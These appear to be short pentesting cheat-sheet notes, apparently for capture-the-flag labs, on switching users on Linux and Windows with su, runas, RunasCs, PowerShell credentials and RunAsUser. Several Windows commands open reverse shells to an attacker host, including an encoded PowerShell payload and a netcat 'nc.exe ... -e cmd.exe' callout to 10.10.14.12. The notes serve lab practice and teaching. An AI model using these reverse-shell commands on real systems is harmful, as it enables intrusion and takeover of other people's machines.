Sometimes we want to switch users without directly authenticating to a machine as them
## Linux
its ez
```bash
su -l <user>
# Enter password
```
## Windows

#### RunAs
This is the most convenient way but sometimes the shell we has is booty cheeks and this will not work because it requires us to enter the password in an interactive manner

Runas
```powershell
# general usage
runas /user:<domain>\<user> cmd.exe

# revshell
runas /user:<domain>\<user> powershell.exe -e <base64_revshell>
```

RunasCs.exe 
```powershell
.\RunasCs.exe <user> <password> powershell -r <LHOST>:<LPORT> [--bypass-uac]

# [-] RunasCsException: Selected logon type '2' is not granted to the user 'JDgodd'. Use available logon type '3'.
--remote-impersonation -l 3 # MIGHT solve this. Not guarenteed. Consider 
```
#### Powershell
First spawn a powershell interactive shell

Usage
```powershell
$username = 'WORKGROUP\<user>'
$securePassword = ConvertTo-SecureString -AsPlainText -Force '<password>'
$credential = New-Object System.Management.Automation.PSCredential $username,$securePassword
Enter-PSSession -ComputerName localhost -Credential $credential
```

#### RunAsUser
https://github.com/atthacks/RunAsUser
solves issue with switching users on windows boxes

to use runas you need an interactive shell
	if you dont, you wont be able to authenticate with the user's password

Example usage
```powershell
.\RunAsUser.exe -u superadmin -p funnyhtb -f c:\users\public\nc.exe -a '10.10.14.12 9001 -e cmd.exe'
```